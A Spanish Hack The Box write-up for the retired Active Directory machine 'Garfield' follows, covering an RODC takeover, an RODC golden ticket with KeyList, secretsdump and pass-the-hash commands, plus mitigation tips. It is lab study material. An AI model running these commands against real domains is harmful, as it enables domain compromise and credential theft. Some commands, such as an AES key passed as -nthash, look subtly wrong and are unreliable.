---
machine: Garfield
os: Windows
difficulty: Hard
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, rodc, krbtgt, golden-ticket, keylist, dcsync, pass-the-hash]
---

# Garfield — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Dominio con **dos controladores**: `DC01` y un **RODC**. El camino pasa por comprometer el RODC (`RODC01`), suplantar a Administrator en él, volcar la clave del `krbtgt_8245` y usar un *ticket dorado* con **KeyList** para pedir un TGT válido en `DC01`. De ahí, hash de Administrator y pass-the-hash.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
nxc smb <IP>
nxc ldap <IP> --kerberos
```

Servicios de DC habituales (53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389) y, al enumerar, dos hosts en el dominio `garfield.htb`: `DC01` y `RODC01`.

```bash
nxc smb <IP> -u j.arbuckle -p '<password>' --shares --users --groups
nxc ldap <IP> -u j.arbuckle -p '<password>' --query "(objectClass=*)" "*" --bloodhound --collection All
```

Credenciales iniciales del enunciado: `j.arbuckle`. BloodHound marca las ACLs explotables hacia el RODC y sus cuentas asociadas.

## Acceso

1. **Enumerar el RODC**: quién puede administrarlo y qué cuentas están en su ámbito (*msDS-RevealOnDemandGroup*, *Allowed RODC Password Replication Group*).

```bash
nxc ldap <IP> -u j.arbuckle -p '<password>' \
  --query "(objectClass=*)""(msDS-RevealOnDemandGroup=*)" 
```

2. **Tomar el RODC**: con los permisos encontrados (ACLs de escritura sobre la cuenta de equipo o sobre sus administradores) se obtiene control administrativo de `RODC01` y se ejecuta código como SYSTEM allí.

```bash
bloodyAD -u '<user>' -p '<password>' -d garfield.htb --host rodc01.garfield.htb add genericAll ...
impacket-psexec garfield.htb/'<user>'@rodc01.garfield.htb
```

3. **Suplantar a Administrator en el RODC** y volcar sus secretos: `sekurlsa`/`lsadump` sobre el propio RODC dan la clave del `krbtgt_8245` (AES256) y las credenciales cacheadas del ámbito.

## Escalada

El salto a `DC01` se hace con un **ticket dorado del RODC**, no del dominio:

```bash
# Ticket dorado para el krbtgt del RODC (krbtgt_8245)
ticketer.py -nthash <krbtgt_8245_aes256> -domain-sid <SID> \
  -domain garfield.htb -dc-ip <IP> -spn krbtgt_8245 \
  administrator
export KRB5CCNAME=administrator.ccache
```

El RODC no firma TGT para el dominio; por eso hay que añadir la extensión **KeyList** (`-key-list` / MS-PAC `PAC_CREDENTIAL_INFO` con `KERB_..._KEY_LIST`) para que `DC01` acepte el ticket y revele la contraseña de la cuenta. Con el ticket válido:

```bash
secretsdump.py -k -no-pass garfield.htb/administrator@dc01.garfield.htb
# hash NTLM de Administrator
```

```bash
evil-winrm -i dc01.garfield.htb -u administrator -H <hash>
```

## Tropiezos

- **Confundir los `krbtgt`**: la clave del RODC es `krbtgt_8245`; la del dominio no se obtiene desde el RODC.
- Sin la extensión KeyList, `DC01` rechaza el ticket del RODC.
- Sincronizar hora (`faketime`) o Kerberos falla con `KRB_AP_ERR_SKEW`.
- Revisar `msDS-RevealOnDemandGroup` antes de asumir qué cuentas se pueden volcar.

## Lecciones

- Un RODC es un objetivo más débil que el DC y su `krbtgt` propio permite forjar tickets con KeyList.
- Los permisos sobre cuentas de equipo y sus administradores son privilegios de dominio en la práctica.
- Mitigación: auditar ACLs sobre RODCs, restringir el grupo de replicación de contraseñas y monitorizar TGT anómalos con `4769`/`4768`.
